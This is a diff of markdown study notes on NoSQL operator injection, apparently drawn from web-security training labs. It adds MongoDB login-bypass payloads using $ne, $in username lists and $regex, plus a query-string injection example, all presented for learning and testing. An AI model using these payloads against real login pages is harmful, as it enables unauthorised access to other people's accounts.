@@ -65,15 +65,16 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 ## NoSQL operator injection
 
-*   Examples of MongoDB query operators
+* Examples of MongoDB query operators
+  * `$where` - Matches documents that satisfy a JavaScript expression.
+  * `$ne` - Matches all values that are not equal to a specified value.
+  * `$in` - Matches all of the values specified in an array.
+  * `$regex` - Selects documents where values match a specified regular expression.
+* MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/reference/operator/query/](https://www.mongodb.com/docs/manual/reference/operator/query/)
 
-    * `$where` - Matches documents that satisfy a JavaScript expression.
-    * `$ne` - Matches all values that are not equal to a specified value.
-    * `$in` - Matches all of the values specified in an array.
-    * `$regex` - Selects documents where values match a specified regular expression.
 
 
-* JSON examplee:
+* JSON example:
   * `{"username":"wiener"}` -> `{"username":{"$ne":"invalid"}}`
 * URL parameters:
   * `username=wiener` -> `username[$ne]=invalid`
@@ -85,12 +86,30 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 
 
+**Testing**
+
+* To test if you can bypass login try to use a valid credentials (example "bob:pass")
+  * `{"username":"bob","password":{"$ne":"invalid"}}`
+  * If it works you can try to bypass login with other username\
+
+
+**Guess with usernames list**
+
+* To target an account, you can construct a payload that includes a known username, or a username that you've guessed:&#x20;
+  * `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`\
+
+
+**Guess with regex**
+
+`{"username":{"$regex":"^adm"},"password":{"$ne":""}}`
+
+
+
+**Other tests**
+
 * Example:`{"username":"wiener","password":"peter"}`
 * `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
 * This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.
-* To target an account, you can construct a payload that includes a known username, or a username that you've guessed: `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`\
-  \
-
 
 
 
